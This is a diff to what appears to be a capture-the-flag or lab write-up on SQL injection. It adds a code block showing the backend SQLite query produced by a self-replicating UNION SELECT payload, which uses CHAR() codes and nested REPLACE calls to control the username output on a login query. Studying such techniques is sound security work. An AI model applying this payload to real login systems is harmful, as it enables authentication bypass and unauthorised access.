@@ -267,6 +267,12 @@ if __name__ == "__main__":
 python py2.py
 Yooo!! testttt"'!
 ```
+##### the query in the backend will look like 
+```sqlite
+SELECT * FROM users WHERE username = 'testtt"\'' AND password = ' UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(" UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -",CHAR(39),CHAR(34)),CHAR(36)," UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -"), CHAR(92), CHAR());-- -'
+```
+
+
 
 ##### Great now we control the username output !!!
 
